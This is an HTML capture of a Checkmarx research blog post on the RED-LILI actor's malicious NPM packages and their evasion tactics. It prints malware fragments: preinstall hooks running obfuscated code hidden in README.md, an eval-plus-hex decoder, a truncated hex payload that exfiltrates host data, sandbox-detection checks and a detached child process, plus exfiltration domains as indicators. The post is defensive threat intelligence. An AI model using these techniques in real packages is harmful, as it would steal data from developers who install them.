@@ -1,0 +1,157 @@
+<div>
+<p><a href="https://checkmarx.com/">Home</a> » Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM</p>
+<h1 class="elementor-heading-title elementor-size-default">Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM</h1>
+<ul class="elementor-inline-items elementor-icon-list-items elementor-post-info">
+<li class="elementor-icon-list-item elementor-repeater-item-ca6b85f elementor-inline-item">
+<a href="https://checkmarx.com/author/talfolkman/">
+ 
+										Tal Folkman					
+</a>
+</li>
+<li class="elementor-icon-list-item elementor-repeater-item-54ddca2 elementor-inline-item">
+ 
+										Co-author Aviad Gershon					
+</li>
+<li class="elementor-icon-list-item elementor-repeater-item-e9bbb12 elementor-inline-item">
+<a href="https://checkmarx.com/2022/04/26/">
+ 
+										April 26, 2022					
+</a>
+</li>
+<li class="elementor-icon-list-item elementor-repeater-item-4abea3a elementor-inline-item">
+ 
+										Reading Time: 5 minutes					
+</li>
+</ul>
+<p>Never miss an update. Subscribe today!</p>Email*Lifecycle StageMarketing AssetUTM CampaignUTM ContentUTM KeywordUTM MediumUTM SourceGCLIDAll UTMs<p> </p><ul class="inputs-list"><li class="hs-form-booleancheckbox"><p>I would like to receive communications from Checkmarx and its affiliates regarding software security, Checkmarx products and services. </p></li></ul><p>By submitting my information to Checkmarx, I hereby consent to the terms and conditions found in the Checkmarx <a href="https://www.checkmarx.com/privacy-policy/" target="_blank">Privacy Policy</a> and to the processing of my personal data as described therein. </p><p>By clicking submit below, you consent to allow Checkmarx to store and process the personal information submitted above to provide you the content requested.</p>
+<img alt="" class="attachment-large size-large" height="437" src="https://checkmarx.com/wp-content/uploads/2021/06/4-circles-yellow-vert.png" width="87"/>
+<img alt="" class="attachment-large size-large" height="512" src="https://checkmarx.com/wp-content/uploads/2022/04/red-lili-thumbnail.png" style="max-width:800px;height:auto;width:auto;" width="1024"/>
+<h1>Intro</h1>
+<p>A few weeks ago, we wrote about a new threat actor we called RED-LILI and described their capabilities, including an in-depth walkthrough of the automated system for publishing malicious NPM packages from automatically created user accounts.
+After our publication, we have seen this same attacker changing their techniques and adding new exfiltration targets, enhancing evasive abilities in an attempt to slow down researchers, and even trying to communicate with the researchers using package names (such as “fuckyouscanner”).</p>
+<h2>RED-LILI Tracker</h2>
+<p>To keep track of RED-LILI as they deliver more <a href="https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fmalicious&amp;trk=public_post_share-update_update-text" rel="noreferrer noopener" target="_blank">malicious</a> packages, our research team has launched RED-LILI Tracker (<a href="https://red-lili.info" rel="noreferrer noopener" target="_blank">https://red-lili.info</a>) - an <a href="https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fopensource&amp;trk=public_post_share-update_update-text" rel="noreferrer noopener" target="_blank">open source</a> mini-project tracking the attacker's packages over time, while sharing analysis findings.</p>
+<figure class="aligncenter size-large"><img alt="" class="wp-image-75561" height="1024" src="https://checkmarx.com/wp-content/uploads/2022/04/image_1-969x1024.png" style="max-width:800px;height:auto;width:auto;" width="969"/></figure>
+<p>https://red-lili.info website</p>
+<figure class="wp-block-image size-full"><img alt="" class="wp-image-75562" height="556" src="https://checkmarx.com/wp-content/uploads/2022/04/image_2.png" style="max-width:800px;height:auto;width:auto;" width="995"/></figure>
+<p>https://red-lili.info package details</p>
+<p>RED-LILI has continued to publish packages similar to the ones we described in our <a href="https://checkmarx.com/blog/a-beautiful-factory-for-malicious-packages/">previous blog</a>. Since then, they published more than 60 malicious packages from over 50 unique accounts. This automated behavior has subsided recently and cleared the way for several changes. In this blog, we describe our new observations regarding this attacker’s TTPs.</p>
+<h1>Message in a bottle</h1>
+<p>Shortly after our publication, and probably in light of the community’s joint efforts in taking down RED-LILI’s malicious packages, we started seeing that some of the package’s names diverging from the normal pattern and seem to try and relay messages such as:</p>
+<ul><li>dontbelikethat</li><li>notsobrilliant</li><li>dontgothereever</li><li>dontblowthisoff</li><li>heisnotwhatyousee</li><li>helloboy634</li><li>nosoawesome232</li><li>fuckyouscanner</li></ul>
+<h1>Hidden Malicious Code in Text Files</h1>
+<p>Most of these “message in a bottle” packages such as the package “dontgothereever” introduced a new tactic. Instead of the normal preinstall script:</p>
+<code>"scripts":{
+ "test":"echo 'error no test specified' &amp;&amp; exit 1",
+ "preinstall":"node index.js"
+ },</code>
+<p>They move the malicious code to “lib/README.md” or “README.md”, obfuscated it, and run it from the preinstall script as before:</p>
+<code>"scripts":{
+ "test":"echo 'error no test specified' &amp;&amp; exit 1",
+ "preinstall":"node lib/README.md"
+ }</code>
+<figure class="aligncenter size-full"><img alt="" class="wp-image-75563" height="428" src="https://checkmarx.com/wp-content/uploads/2022/04/image_3.png" style="max-width:800px;height:auto;width:auto;" width="747"/></figure>
+<p>obfuscated README.md</p>
+<h1>Stolen Package Description</h1>
+<p>Another experiment with the package description files in RED-LILI’s recent attacks, which we saw in the “wf_storage” package for example, is the attacker stealing another project’s description (<a href="https://github.com/raincatcher-beta/raincatcher-file#supported-storage-engines" rel="noreferrer noopener" target="_blank">https://github.com/raincatcher-beta/raincatcher-file#supported-storage-engines</a>). In an attempt to make the package look more credible.</p>
+<figure class="aligncenter size-large is-resized"><img alt="" class="wp-image-75564" height="815" src="https://checkmarx.com/wp-content/uploads/2022/04/image_4-1024x994.png" style="max-width:800px;height:auto;width:auto;" width="840"/></figure>
+<p>Stolen project description appears in the malicious package, taken from a random GitHub page</p>
+<h1>eval() &amp; hexilify() a match made in hell</h1>
+<p>Another new obfuscation technique we observed, in “turbine_helper” for example, is a combined usage of the nefarious built-in function “eval()” and the “hexilify()” function written by the package’s developer.</p>
+<p>We saw two different usages of this combination:</p>
+<code>function render(image){
+eval(hexify(package,hexify(package,image)));}</code>
+<p>Or:</p>
+<code>eval(hexilify(package,img))</code>
+<p>the “hexilify()” function’s main purpose is to decode hexadecimal string into the original code.</p>
+<code>function hexilify(pack,data) {
+ const bufferText = Buffer.from(data, 'hex');
+ const text = bufferText.toString('ascii');
+ return text.replace('%%%%%%',pack);
+}</code>
+<p>The hex encoded input to this function varies slightly between the different packages using it, but it looks roughly as follows:</p>
+<code>img="636f6e7374206f73203d207265717569726528226f7322293b0a636f6e737420646e73203d20726571756972652822646e7322293b0a636f6e7374207175657279737472696e67203d207265717569726528227175657279737472696e6722293b0a636f6e7374206874747073203d20726571756972652822687474707322293b0a636f6e7374206673203d20726571756972652827667327293b0a766172207061…
+571203d2068747470732e72657175657374286f7074696f6e732c202872657329203d3e207b0a20202020202020207265732e6f6e282264617461222c20286429203d3e207b0a2020202020202020202020202f2f70726f636573732e7374646f75742e77726974652864293b0a20202020202020207d293b0a202020207d293b0a0a202020207265712e6f6e28226572726f72222c20286529203d3e207b0a20202020202020202f2f20636f6e736f6c652e6572726f722865293b0a202020207d293b0a0a202020207265712e777269746528706f737444617461293b0a202020207265712e656e6428293b0a7d";</code>
+<p>the “hexilify()” is also used in other parts of the code to hinder defenders using static analysis by obfuscating strings that may use to identify this attacker’s activity.</p>
+<code>function isValid(hostname, path, username) {
+ if (hostname == unhexify("4445534b544f502d3445314953304b") &amp;&amp; username == unhexify("6461617361646d696e")) {
+ return false;
+ } else if (hostname == unhexify('626f78')) {
+ return false;
+ } else if (checkhex(hostname)) {
+ return false;
+ } else if (checkuuid(hostname)) {
+ return false;
+ }
+ else if (hostname == unhexify('6c696c692d7063')) {
+ return false;
+ } else if (hostname == unhexify('6177732d3767726172613931336f6964356a736578676b71')) {
+ return false;
+ }
+ else if (hostname == unhexify('696e7374616e6365')) {
+ return false;
+ } else {
+ return true;
+ }
+ return true;
+}</code>
+<p>Usage of the hexilify function</p>
+<h1>isValid() adjustments</h1>
+<p>In the field of security scanners’ detection, we saw a minor change in the “isValid()” function, which is meant to detect hostnames and usernames belonging to scanners or other machines the attacker want to avoid from running on.</p>
+<p>In the package “bfs-hello-world” for example, we saw a new regex which was made to detect “uuid”s (Universal Unique Identifier) and keep the code from running in these environments. This is possibly because the attacker noticed security scanners with “uuid”s as hostnames and tried to avoid it as well.</p>
+<code>function checkuuid(inputString) {
+ var re = /^[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+-[0-9a-f]+$/g;
+ if (re.test(inputString)) {
+ return true
+ } else {
+ return false;
+ }
+}</code>
+<h1>Using 'child_process'</h1>
+<p>In the package “bfx-hf-func-data”, we saw for the first time the usage of “child_process” from this attacker. Here, the preinstall script still runs the index.js file upon package installation, but this file itself contains different code with include the following snippets:</p>
+<code>var spawn = require('child_process').spawn;
+spawn('node', ['bgService.js',process.pid], {
+ stdio: 'ignore', // piping all stdio to /dev/null
+ detached: true
+}).unref();</code>
+<p>These lines of code spawn a child process that runs the bgService.js file which contains the same hex encoded malicious code we saw before.</p>
+<h1>The Next Attack Wave is Coming</h1>
+<p>Since the previous wave we wrote about in our first blogpost about the attacker, RED-LILI have slowed down and paused the burst automation attacks. They dumped their old domain names and registered a new domain (22timer[.]ga). We believe the next wave is yet to come and that RED-LILI is now exploring and publishing cherry-picked packages, each with different evasion technique.</p>
+<p>However, the attacker’s thumbprint still remains as they re-use similar characteristics (code similarity, same identifying strings, etc.). In recent packages they are doing it while exfiltrating the data they collect to previously unknown addresses on different services, from what we have seen before such as free webhook services, for example, pipedream and requestbin.</p>
+<figure class="aligncenter size-large"><img alt="" class="wp-image-75565" height="670" src="https://checkmarx.com/wp-content/uploads/2022/04/image_5-1024x670.png" style="max-width:800px;height:auto;width:auto;" width="1024"/></figure>
+<p>old domains</p>
+<figure class="aligncenter size-full"><img alt="" class="wp-image-75566" height="474" src="https://checkmarx.com/wp-content/uploads/2022/04/image_6.png" style="max-width:800px;height:auto;width:auto;" width="995"/></figure>
+<p>new 22timer.ga domain</p>
+<p>Some of the latest packages published have also showed slight changes in regard to the user accounts publishing them. Up until now we were used to randomly generated usernames publishing a single package per account. However, the recent packages RED-LILI have published were from the usernames “john.moralis” and “leftwing_tenore” with the latter publishing 5 different packages.</p>
+<h1>Conclusion</h1>
+<p>In the past weeks, Checkmarx supply chain security team is tracking the threat actor RED-LILI which is constantly developing its capabilities. In this blog we reported about RED-LILI’s recent changes in code and TTP’s.</p>
+<p>Furthermore, our research team has launched <a href="https://red-lili.info" rel="noreferrer noopener" target="_blank">red-lili.info</a> - an <a href="https://www.linkedin.com/signup/cold-join?session_redirect=https%3A%2F%2Fwww%2Elinkedin%2Ecom%2Ffeed%2Fhashtag%2Fopensource&amp;trk=public_post_share-update_update-text" rel="noreferrer noopener" target="_blank">open source</a> mini-project tracking the attacker's packages over time, while sharing analysis findings.</p>
+<h1>IOC’s</h1>
+<ul><li>eome8ew0yti04in.m.pipedream[.]net</li><li>eo74s7cfv23fror.m.pipedream[.]net</li><li>33mail[.]ga</li><li>636o3.fuzzdb[.]cf</li><li>3faa13bc25347fa55cff.d.requestbin[.]net</li><li>425a2.33mail[.]ga</li><li>22timer[.]ga</li></ul>
+<h1>Packages</h1>
+<figure class="wp-block-image size-full"><img alt="" class="wp-image-75573" height="854" src="https://checkmarx.com/wp-content/uploads/2022/04/1.jpg" width="505"/></figure>
+<figure class="wp-block-image size-full"><img alt="" class="wp-image-75575" height="762" src="https://checkmarx.com/wp-content/uploads/2022/04/2.jpg" width="506"/></figure>
+<figure class="wp-block-image size-full"><img alt="" class="wp-image-75576" height="282" src="https://checkmarx.com/wp-content/uploads/2022/04/3.jpg" width="508"/></figure>
+<p>Never miss an update. Subscribe today!</p>Email*Lifecycle StageMarketing AssetUTM CampaignUTM ContentUTM KeywordUTM MediumUTM SourceGCLIDAll UTMs<p> </p><ul class="inputs-list"><li class="hs-form-booleancheckbox"><p>I would like to receive communications from Checkmarx and its affiliates regarding software security, Checkmarx products and services. </p></li></ul><p>By submitting my information to Checkmarx, I hereby consent to the terms and conditions found in the Checkmarx <a href="https://www.checkmarx.com/privacy-policy/" target="_blank">Privacy Policy</a> and to the processing of my personal data as described therein. </p><p>By clicking submit below, you consent to allow Checkmarx to store and process the personal information submitted above to provide you the content requested.</p>
+<h2 class="elementor-heading-title elementor-size-default">More Resources to Consider</h2>
+<img alt="" class="attachment-full size-full" height="512" src="https://checkmarx.com/wp-content/uploads/2022/04/red-lili-thumbnail.png" style="max-width:800px;height:auto;width:auto;" width="1024"/>
+<a class="elementor-icon" href="https://checkmarx.com/blog/attacker-adds-evasive-technique-to-their-ongoing-attacks-on-npm/" target="_self"></a>
+<a href="https://checkmarx.com/blog/attacker-adds-evasive-technique-to-their-ongoing-attacks-on-npm/" target="_self">
+				Attacker Adds Evasive Technique to Their Ongoing Attacks on NPM			</a>
+April 26, 2022
+<img alt="" class="attachment-full size-full" height="1251" src="https://checkmarx.com/wp-content/uploads/2022/04/Final_APRIL21_Gartner2022_Gartner-Blog-Post-Banner.png" style="max-width:800px;height:auto;width:auto;" width="2501"/>
+<a class="elementor-icon" href="https://checkmarx.com/blog/checkmarx-named-a-leader-in-the-2022-gartner-magic-quadrant-for-application-security-testing-for-the-5th-consecutive-year/" target="_self"></a>
+<a href="https://checkmarx.com/blog/checkmarx-named-a-leader-in-the-2022-gartner-magic-quadrant-for-application-security-testing-for-the-5th-consecutive-year/" target="_self">
+				Checkmarx Named a Leader in the 2022 Gartner® Magic Quadrant™ for Application Security Testing for the 5th Consecutive Year			</a>
+April 21, 2022
+<img alt="" class="attachment-full size-full" height="512" src="https://checkmarx.com/wp-content/uploads/2022/04/thumbnail.png" style="max-width:800px;height:auto;width:auto;" width="1024"/>
+<a class="elementor-icon" href="https://checkmarx.com/blog/starjacking-making-your-new-open-source-package-popular-in-a-snap/" target="_self"></a>
+<a href="https://checkmarx.com/blog/starjacking-making-your-new-open-source-package-popular-in-a-snap/" target="_self">
+				StarJacking – Making Your New Open Source Package Popular in a Snap			</a>
+April 19, 2022
+<img alt="" class="attachment-full size-full" height="1067" src="https://checkmarx.com/wp-content/uploads/2022/04/JetBrains_social_Blog-Social-Header-1024x512-35.png" style="max-width:800px;height:auto;width:auto;" width="2134"/>
+<a class="elementor-icon" href="https://checkmarx.com/blog/checkmarx-and-jetbrains-make-great-apps-secure-apps/" target="_self"></a>
+<a href="https://checkmarx.com/blog/checkmarx-and-jetbrains-make-great-apps-secure-apps/" target="_self">
+				Checkmarx and JetBrains Make Great Apps, Secure Apps			</a>
+April 14, 2022
+</div>
